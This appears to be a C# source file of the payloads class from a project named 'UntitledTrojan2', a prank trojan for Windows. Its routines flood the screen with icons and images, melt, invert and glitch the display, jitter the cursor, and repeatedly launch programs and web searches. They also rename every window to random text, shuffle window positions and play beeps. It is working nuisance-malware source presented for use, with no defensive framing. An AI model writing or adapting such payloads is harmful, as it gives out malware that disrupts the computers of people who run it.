using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Media;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using UntitledTrojan2.Payloads;
using UntitledTrojan2.Properties;

namespace UntitledTrojan2.Payloads
{
    internal class PayloadsClass
    {
        #region Variables
        #region GDI32
        [DllImport("gdi32.dll")]
        internal static extern IntPtr CreateDC(string lpszDriver, string lpszDevice, string lpszOutput, string lpInitData);
        [DllImport("gdi32.dll")]
        internal static extern bool StretchBlt(IntPtr hdcDest, int xDest, int yDest, int wDest, int hDest, IntPtr hdcSrc, int xSrc, int ySrc, int wSrc, int hSrc, int rop);
        #endregion
        #region USER32
        [DllImport("user32.dll")]
        internal static extern int GetSystemMetrics(int smIndex);

        internal static int width = GetSystemMetrics(0);
        internal static int height = GetSystemMetrics(1);

        [DllImport("user32.dll")]
        internal static extern IntPtr LoadIcon(IntPtr hInstance, int lpIconName);

        [DllImport("user32.dll")]
        internal static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        internal static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);

        [DllImport("user32.dll")]
        internal static extern bool DrawIcon(IntPtr hdc, int xLeft, int yTop, IntPtr hIcon);

        [DllImport("user32")]
        internal static extern bool GetCursorPos(out POINT lpPoint);

        [DllImport("user32.dll")]
        internal static extern bool MessageBeep(uint type);

        internal delegate bool EnumDesktopWindowsDelegate(IntPtr hWnd, int lParam);

        [DllImport("user32.dll")]
        internal static extern bool EnumWindows(EnumDesktopWindowsDelegate i, IntPtr x);

        [DllImport("user32.dll")]
        internal static extern bool EnumChildWindows(IntPtr hwnd, EnumDesktopWindowsDelegate i, IntPtr x);

        [DllImport("user32.dll")]
        internal static extern bool SetWindowTextA(IntPtr hwnd, IntPtr lp);
        #endregion
        #region KERNEL32
        [DllImport("kernel32.dll")]
        internal static extern IntPtr GlobalAlloc(uint flags, int size);

        [DllImport("kernel32.dll")]
        internal static extern bool GlobalFree(IntPtr ptr);
        #endregion
        #region Other
        internal struct POINT
        {
            public int x { get; set; }
            public int y { get; set; }
        }

        internal struct RECT
        {
            public int left { get; set; }
            public int top { get; set; }
            public int right { get; set; }
            public int bottom { get; set; }
        }
        internal static Random random = new Random();
        #endregion
        #endregion

        #region Warn Payload
        public class Warn
        {
            public bool IsSafe { get { return true; } }

            public void OnTick(int c)
            {
                new Thread(async () => {
                    int ticks = 0;
                    int count = c;
                    while (ticks < count)
                    {
                        ticks++;
                        IntPtr hdc = CreateDC("DISPLAY", null, null, null);
                        IntPtr icon = LoadIcon(IntPtr.Zero, random.Next(32512, 32518));
                        DrawIcon(hdc, random.Next(0, width), random.Next(0, height), icon);
                        await Task.Delay(100);
                    }
                }).Start();
            }
        }
        #endregion

        #region Warn Cursor Payload
        public class WarnCursor
        {
            public bool IsSafe { get { return true; } }

            public void OnTick(int c)
            {
                new Thread(async () => {
                    int ticks = 0;
                    int count = c;
                    while (ticks < count)
                    {
                        ticks++;
                        IntPtr hdc = CreateDC("DISPLAY", null, null, null);
                        IntPtr icon = LoadIcon(IntPtr.Zero, 32513);
                        DrawIcon(hdc, Cursor.Position.X, Cursor.Position.Y, icon);
                        await Task.Delay(10);
                        int r = random.Next(0, 8);
                        switch (r)
                        {
                            case 0: Cursor.Position = new Point(Cursor.Position.X + random.Next(1, 10), Cursor.Position.Y); break;
                            case 1: Cursor.Position = new Point(Cursor.Position.X - random.Next(1, 10), Cursor.Position.Y); break;
                            case 2: Cursor.Position = new Point(Cursor.Position.X, Cursor.Position.Y + random.Next(1, 10)); break;
                            case 3: Cursor.Position = new Point(Cursor.Position.X, Cursor.Position.Y - random.Next(1, 10)); break;
                            case 4: Cursor.Position = new Point(Cursor.Position.X + random.Next(1, 10), Cursor.Position.Y + random.Next(1, 10)); break;
                            case 5: Cursor.Position = new Point(Cursor.Position.X - random.Next(1, 10), Cursor.Position.Y + random.Next(1, 10)); break;
                            case 6: Cursor.Position = new Point(Cursor.Position.X + random.Next(1, 10), Cursor.Position.Y - random.Next(1, 10)); break;
                            case 7: Cursor.Position = new Point(Cursor.Position.X - random.Next(1, 10), Cursor.Position.Y - random.Next(1, 10)); break;
                        }
                    }
                }).Start();
            }
        }
        #endregion

        #region Start Apps Payload
        public class StartApps
        {
            public bool IsSafe { get { return false; } }

            public void OnTick(int c)
            {
                new Thread(async () => {
                    int ticks = 0;
                    int count = c;
                    while (ticks < count)
                    {
                        ticks++;
                        int r = random.Next(0, 6);
                        switch (r)
                        {
                            case 0: Process.Start("calc"); break;
                            case 1: Process.Start("control"); break;
                            case 2: Process.Start("explorer"); break;
                            case 3: Process.Start("mspaint"); break;
                            case 4: Process.Start("notepad"); break;
                            case 5: Process.Start("wordpad"); break;
                        }
                        await Task.Delay(5000);
                    }
                }).Start();
            }
        }
        #endregion

        #region Glitch Payload
        public class Glitch
        {
            public bool IsSafe { get { return true; } }

            public void OnTick(int c)
            {
                new Thread(async () => {
                    int ticks = 0;
                    int count = c;
                    while (ticks < count)
                    {
                        ticks++;
                        IntPtr hdc = CreateDC("DISPLAY", null, null, null);
                        int x1 = random.Next(0, width);
                        int y1 = random.Next(0, height);
                        int x2 = random.Next(0, width);
                        int y2 = random.Next(0, height);
                        int w = random.Next(0, 300);
                        int h = random.Next(0, 300);
                        int w2 = random.Next(0, width);
                        int h2 = random.Next(0, height);
                        StretchBlt(hdc, x1, y1, w, h, hdc, x2, y2, w2, h2, 0x00660046);
                        await Task.Delay(500);
                    }
                }).Start();
            }
        }
        #endregion

        #region Amogus Payload
        public class Amogus
        {
            public bool IsSafe { get { return true; } }

            public void OnTick(int c)
            {
                new Thread(async () => {
                    int ticks = 0;
                    int count = c;
                    while (ticks < count)
                    {
                        ticks++;
                        IntPtr hdc = CreateDC("DISPLAY", null, null, null);
                        Graphics g = Graphics.FromHdc(hdc);
                        bool monke = random.Next(0, 100) < 8 ? true : false;
                        int x = random.Next(0, width);
                        int y = random.Next(0, height);
                        if (monke) g.DrawImage(Resources.monke, x, y);
                        else g.DrawImage(Resources.among, x, y);
                        await Task.Delay(100);
                    }
                }).Start();
            }
        }
        #endregion

        #region Text Fucker Payload
        public class TextFucker
        {
            public bool IsSafe { get { return false; } }

            public void OnTick(int c)
            {
                new Thread(async () => {
                    int ticks = 0;
                    int count = c;
                    while (ticks < count)
                    {
                        ticks++;
                        // Change window titles
                        EnumWindows((hWnd, lParam) => {
                            EnumChildWindows(hWnd, (hwnd, param) => {
                                SetWindowTextA(hwnd, Marshal.StringToHGlobalAnsi(RandomString(10)));
                                return true;
                            },  (IntPtr)null);
                            SetWindowTextA(hWnd, Marshal.StringToHGlobalAnsi(RandomString(10)));
                            return true;
                        }, (IntPtr)null);

                        // Tray
                        Process[] processes = Process.GetProcessesByName("explorer");
                        foreach (Process p in processes)
                        {
                            IntPtr hWnd = p.MainWindowHandle;
                            EnumChildWindows(hWnd, (hwnd, param) => {
                                SetWindowPos(hwnd, (IntPtr)0, random.Next(-5, 5), random.Next(-5, 5), 0, 0, 0x0001 | 0x0200);
                                return true;
                            }, (IntPtr)null);
                        }

                        // All windows
                        IntPtr hwnd = GetForegroundWindow();
                        EnumChildWindows(hwnd, (hwnd1, param) => {
                            SetWindowPos(hwnd1, (IntPtr)0, random.Next(0, 80), random.Next(0, 80), random.Next(10, 50), random.Next(10, 50), 0x0001);
                            return true;
                        }, (IntPtr)null);
                        await Task.Delay(1000);
                    }
                }).Start();
            }
        }
        #endregion

        #region Melter Payload
        public class Melter
        {
            public bool IsSafe { get { return true; } }

            public void OnTick(int c)
            {
                new Thread(async () => {
                    int ticks = 0;
                    int count = c;
                    while (ticks < count)
                    {
                        ticks++;
                        IntPtr hdc = CreateDC("DISPLAY", null, null, null);
                        for (int x = 0; x < width; x += 5) 
                            StretchBlt(hdc, x, random.Next(1, 10), 5, height, hdc, x, 0, 5, height, 0x00C000CA);
                        await Task.Delay(10);
                    }
                }).Start();
            }
        }
        #endregion

        #region Text Payload
        public class PayloadText
        {
            public bool IsSafe { get { return true; } }

            public void OnTick(int c)
            {
                new Thread(() => {
                    int ticks = 0;
                    int count = c;
                    while (ticks < count)
                    {
                        ticks++;
                        Graphics g = Graphics.FromHdc(CreateDC("DISPLAY", null, null, null));
                        g.DrawString(PayloadsManager.payload, SystemFonts.DefaultFont, new SolidBrush(Color.Gray), 2, 2);
                        g.DrawString(PayloadsManager.payload, SystemFonts.DefaultFont, new SolidBrush(Color.White), 0, 0);
                    }
                }).Start();
            }
        }
        #endregion

        #region Screen Glitch Payload
        public class ScreenGlitch
        {
            public bool IsSafe { get { return true; } }

            public void OnTick(int c)
            {
                new Thread(async () => {
                    int ticks = 0;
                    int count = c;
                    while (ticks < count)
                    {
                        ticks++;
                        IntPtr hdc = CreateDC("DISPLAY", null, null, null);
                        StretchBlt(hdc, 0, 0, width, height, hdc, 0, 0, width, height, 0x00660046);
                        await Task.Delay(1000);
                    }
                }).Start();
            }
        }
        #endregion

        #region Recursive Payload
        public class Recursive
        {
            public bool IsSafe { get { return true; } }

            public void OnTick(int c)
            {
                new Thread(async () => {
                    int ticks = 0;
                    int count = c;
                    while (ticks < count)
                    {
                        ticks++;
                        IntPtr hdc = CreateDC("DISPLAY", null, null, null);
                        int x = 50;
                        int y = 50;
                        int w = Screen.PrimaryScreen.Bounds.Width - 100;
                        int h = Screen.PrimaryScreen.Bounds.Height - 100;
                        StretchBlt(hdc, x, y, w, h, hdc, 0, 0, width, height, 0x00C000CA);
                        await Task.Delay(50);
                    }
                }).Start();
            }
        }
        #endregion

        #region Invert Payload
        public class Invert
        {
            public bool IsSafe { get { return true; } }

            public void OnTick(int c)
            {
                new Thread(async () => {
                    int ticks = 0;
                    int count = c;
                    while (ticks < count)
                    {
                        ticks++;
                        IntPtr hdc = CreateDC("DISPLAY", null, null, null);
                        StretchBlt(hdc, 0, 0, width, height, hdc, 0, 0, width, height, 0x005A0049);
                        await Task.Delay(1000);
                    }
                }).Start();
            }
        }
        #endregion

        #region Links Payload
        public class Links
        {
            public bool IsSafe { get { return false; } }

            public void OnTick(int c)
            {
                new Thread(async () => {
                    int ticks = 0;
                    int count = c;
                    while (ticks < count)
                    {
                        ticks++;
                        int r = random.Next(0, 5);
                        switch (r)
                        {
                            case 0: Process.Start("http://google.com/search?q=Amogus"); break;
                            case 1: Process.Start("http://google.com/search?q=Скачать+Among+Us"); break;
                            case 2: Process.Start("http://google.com/search?q=Как+удалить+вирус"); break;
                            case 3: Process.Start("http://google.com/search?q=TheAirBlow+;)"); break;
                            case 4: Process.Start("http://google.com/search?q=Как+amogus"); break;
                        }
                        await Task.Delay(5000);
                    }
                }).Start();
            }
        }
        #endregion

        #region Sounds Payload
        public class Sounds
        {
            public bool IsSafe { get { return true; } }

            public void OnTick(int c)
            {
                new Thread(async () => {
                    int ticks = 0;
                    int count = c;
                    while (ticks < count)
                    {
                        ticks++;
                        int r = random.Next(0, 5);
                        switch (r)
                        {
                            case 0: MessageBeep(0x00000040); break;
                            case 1: MessageBeep(0x00000030); break;
                            case 2: MessageBeep(0x00000010); break;
                            case 3: MessageBeep(0x00000000); break;
                            case 4: MessageBeep(0xFFFFFFFF); break;
                        }
                        await Task.Delay(1000);
                    }
                }).Start();
            }
        }
        #endregion

        #region Helpers
        internal static string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        internal static Bitmap Screenshot()
        {
            Bitmap screenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics gfxScreenshot = Graphics.FromImage(screenshot);
            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0,
                Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
            gfxScreenshot.Dispose();
            return screenshot;
        }
        #endregion
    }
}
